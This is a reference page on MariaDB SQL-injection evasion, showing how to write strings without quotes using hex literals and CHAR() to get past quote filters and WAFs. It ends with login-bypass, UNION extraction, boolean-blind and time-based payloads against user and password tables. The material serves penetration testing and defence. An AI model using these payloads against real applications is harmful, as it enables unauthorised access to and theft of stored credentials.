---
title: Avoiding Quotations
description: Techniques to avoid using quotes in MariaDB injection
category: Injection Techniques
order: 10
tags: ["quotes", "evasion", "bypass"]
lastUpdated: 2025-12-18
---

## Avoiding Quotations

In some scenarios, web applications may implement filters that block or sanitize quotation marks (`'` or `"`). These techniques allow you to construct strings without using quotes.

## Using Hexadecimal Notation

MariaDB allows representing string literals in hexadecimal by prefixing the hex value with `0x`:

```sql
-- 'admin' in hex
SELECT 0x61646D696E

-- 'root' in hex
SELECT 0x726F6F74

-- 'password' in hex
SELECT 0x70617373776F7264

-- Empty string (use X'' syntax)
SELECT X''
```

### Common Hex Values

| String     | Hex Value            |
| ---------- | -------------------- |
| `admin`    | `0x61646D696E`       |
| `root`     | `0x726F6F74`         |
| `password` | `0x70617373776F7264` |
| `users`    | `0x7573657273`       |
| `:`        | `0x3A`               |
| `,`        | `0x2C`               |
| `%`        | `0x25`               |

### Hex in WHERE Clause

```sql
-- Compare username without quotes
SELECT username FROM users WHERE username = 0x61646D696E

-- Hex for LIKE pattern (adm%)
SELECT username FROM users WHERE username LIKE CONCAT(0x61646D, 0x25)
```

### Hex in UNION SELECT

```sql
-- Inject string via UNION
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, 0x696E6A656374696F6E
-- 0x696E6A656374696F6E = 'injection'
```

### Hex for Table/Column Comparisons

```sql
-- Query information_schema without quotes
SELECT table_name FROM information_schema.tables
WHERE table_schema = database() AND table_name = 0x7573657273
-- 0x7573657273 = 'users'
```

## Using CHAR() Function

The `CHAR()` function converts decimal ASCII values to characters:

```sql
-- 'root' using CHAR()
SELECT CHAR(114, 111, 111, 116)
-- 114=r, 111=o, 111=o, 116=t

-- 'admin' using CHAR()
SELECT CHAR(97, 100, 109, 105, 110)
-- 97=a, 100=d, 109=m, 105=i, 110=n

-- Single character
SELECT CHAR(65)
-- 65 = 'A'
```

### Common ASCII Values

| Char | ASCII | Char | ASCII |
| ---- | ----- | ---- | ----- |
| `a`  | 97    | `A`  | 65    |
| `d`  | 100   | `@`  | 64    |
| `m`  | 109   | `:`  | 58    |
| `i`  | 105   | `'`  | 39    |
| `n`  | 110   | `"`  | 34    |
| `r`  | 114   | `\`  | 92    |
| `o`  | 111   | ` `  | 32    |
| `t`  | 116   | `%`  | 37    |

### Concatenating with CHAR()

```sql
-- 'root@localhost' using CONCAT and CHAR()
SELECT CONCAT(
  CHAR(114, 111, 111, 116),
  CHAR(64),
  CHAR(108, 111, 99, 97, 108, 104, 111, 115, 116)
)
-- Results in: root@localhost
```

### Special Characters with CHAR()

```sql
-- Quote characters and backslash
SELECT CHAR(39, 34, 92)
-- 39 = ', 34 = ", 92 = \ -> produces: '"\
```

### CHAR() in WHERE Clause

```sql
-- Compare without quotes
SELECT username FROM users WHERE username = CHAR(97, 100, 109, 105, 110)

-- Multiple conditions
SELECT username, password FROM users
WHERE username = CHAR(97, 100, 109, 105, 110)
AND password = CHAR(112, 97, 115, 115)
```

### CHAR() with Character Set

```sql
-- Specify encoding with USING clause
SELECT CHAR(97 USING utf8mb4)
-- Returns: a
```

## Building SQL with CHAR()

For prepared statements or dynamic SQL:

```sql
-- Building 'SELECT 1' using CHAR
SELECT CHAR(83, 69, 76, 69, 67, 84, 32, 49) AS sql_stmt
-- S=83, E=69, L=76, E=69, C=67, T=84, space=32, 1=49

-- Building 'SELECT @@version'
SELECT CHAR(115, 101, 108, 101, 99, 116, 32, 64, 64, 118, 101, 114, 115, 105, 111, 110) AS sql_stmt
```

### Prepared Statement Execution

```sql
-- Requires multi-statement support
SET @sql = CHAR(115, 101, 108, 101, 99, 116, 32, 64, 64, 118, 101, 114, 115, 105, 111, 110);
PREPARE stmt FROM @sql;
EXECUTE stmt;
-- Executes: SELECT @@version
```

## Combining Techniques

### Hex and CHAR() Combined

```sql
-- 'admin' using both techniques
SELECT CONCAT(0x61646D, CHAR(105, 110))
-- 0x61646D = 'adm', CHAR(105, 110) = 'in' -> 'admin'
```

### CONCAT_WS Without Quotes

```sql
-- Use CHAR() for separator
SELECT CONCAT_WS(CHAR(58), 0x61646D696E, 0x70617373)
-- CHAR(58) = ':', result = 'admin:pass'
```

### GROUP_CONCAT Without Quotes

```sql
-- Use hex for separator
SELECT GROUP_CONCAT(username SEPARATOR 0x2C) AS users FROM users
-- 0x2C = ','

-- Use CHAR for separator
SELECT GROUP_CONCAT(username SEPARATOR CHAR(124)) AS users FROM users
-- CHAR(124) = '|'

-- Example output with pipe separator
-- admin|user1|user2
```

## Encoding Utilities (Require Quoted Input)

> **Important:** The functions in this section require quoted string arguments and therefore **do not bypass quote filters**. They are documented here for completeness and understanding encoding workflows, but cannot be used when quotes are blocked.

### UNHEX Function

```sql
-- UNHEX converts hex string to binary/string
SELECT UNHEX('61646D696E')
-- Returns: admin (note: requires quoted hex string - not useful for bypassing quote filters)

-- Quote-free alternative: use 0x notation directly instead
SELECT 0x61646D696E
-- Returns: admin (no quotes needed)
```

### HEX Function

```sql
-- HEX encodes string to hexadecimal (requires quoted input)
SELECT HEX('admin')
-- Returns: 61646D696E

-- Useful for encoding output, not for bypassing input filters
```

### Binary Literals

```sql
-- Binary literal for 'A' (01000001)
SELECT b'01000001'
-- Returns: 65 (numeric value) or binary representation
-- Note: Binary literals do not require quotes but produce numeric values
```

### Base64 Encoding

```sql
-- Decode Base64 string (requires quoted input - cannot bypass quote filters)
SELECT FROM_BASE64('YWRtaW4=')
-- 'YWRtaW4=' = 'admin' in Base64

-- Encode to Base64 (requires quoted input)
SELECT TO_BASE64('admin')
-- Returns: YWRtaW4=
```

> **Summary:** For bypassing quote filters, use `0x` hex notation or `CHAR()` with numeric ASCII values. The encoding functions above are useful for other purposes but require quoted strings as input.

## Numeric Conversions

### CONV Function

```sql
-- Convert decimal to hex
SELECT CONV(97, 10, 16)
-- Converts 97 (decimal) to hex = '61'

-- Convert hex to decimal
SELECT CONV('61', 16, 10)
-- Converts '61' (hex) to decimal = 97

-- Practical use: convert ASCII to hex for encoding
SELECT CONV(ASCII('a'), 10, 16)
-- Returns: '61'
```

### ASCII and ORD Functions

```sql
-- Get ASCII value from hex
SELECT ASCII(0x61)
-- Returns: 97

-- ORD is similar to ASCII
SELECT ORD(0x61)
-- Returns: 97
```

## Injection Context Examples

### Login Bypass Without Quotes

```sql
-- Using hex for username comparison
SELECT * FROM users WHERE username = 0x61646D696E

-- Using CHAR() for credentials
SELECT * FROM users
WHERE username = CHAR(97, 100, 109, 105, 110)
AND password = CHAR(112, 97, 115, 115)
```

### Data Extraction Without Quotes

```sql
-- Extract password using hex comparison
SELECT (SELECT password FROM users WHERE username = 0x61646D696E) AS pw

-- UNION injection with hex prefix
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT(0x757365726E616D653A, username)
FROM users LIMIT 1
-- 0x757365726E616D653A = 'username:'
```

### Boolean Blind Without Quotes

```sql
-- Compare extracted value with hex
SELECT IF(
  (SELECT username FROM users WHERE id = 1) = 0x61646D696E,
  1, 0
)
-- Tests if first user is 'admin'
```

### Time-Based Without Quotes

```sql
-- Delay if condition matches using hex
SELECT IF(
  (SELECT username FROM users LIMIT 1) = 0x61646D696E,
  SLEEP(5), 0
)
-- If first user is 'admin', query delays 5 seconds

-- Test specific character using SUBSTR and hex
SELECT IF(
  SUBSTR((SELECT password FROM users WHERE id = 1), 1, 1) = 0x70,
  SLEEP(3), 0
)
-- 0x70 = 'p', delays if password starts with 'p'
```

## Quick Reference

| Technique     | Syntax               | Example for 'admin'        |
| ------------- | -------------------- | -------------------------- |
| Hex (0x)      | `0x` + hex value     | `0x61646D696E`             |
| Hex (X'')     | `X'` + hex + `'`     | `X'61646D696E'`            |
| CHAR()        | `CHAR(ascii, ...)`   | `CHAR(97,100,109,105,110)` |
| UNHEX()       | `UNHEX('hex')`       | `UNHEX('61646D696E')`      |
| FROM_BASE64() | `FROM_BASE64('b64')` | `FROM_BASE64('YWRtaW4=')`  |

These techniques are particularly useful for bypassing WAFs (Web Application Firewalls) and other security filters that specifically block quoted strings in SQL queries.
